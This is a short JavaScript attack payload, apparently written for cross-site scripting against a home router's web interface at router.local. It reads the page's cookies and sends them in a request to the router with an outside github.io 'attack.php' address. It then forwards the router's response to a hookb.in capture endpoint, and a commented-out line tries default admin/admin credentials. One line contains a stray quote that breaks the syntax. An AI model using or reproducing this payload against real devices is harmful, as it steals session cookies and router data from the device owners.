const http = new XMLHttpRequest();
//http.open('POST', 'http://router.local/login.php', true);
const cook = document.cookie;
http.open('POST', 'http://router.local/home.php?action=https://nastassiagoodson.github.io/attack.php&'+cook', true);

http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/gg0zledkpZFG7Voo8PQX', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.responseText));

};

http.send();
//http.send(cook+"&username=admin&pin=admin&notRobot=on");

   

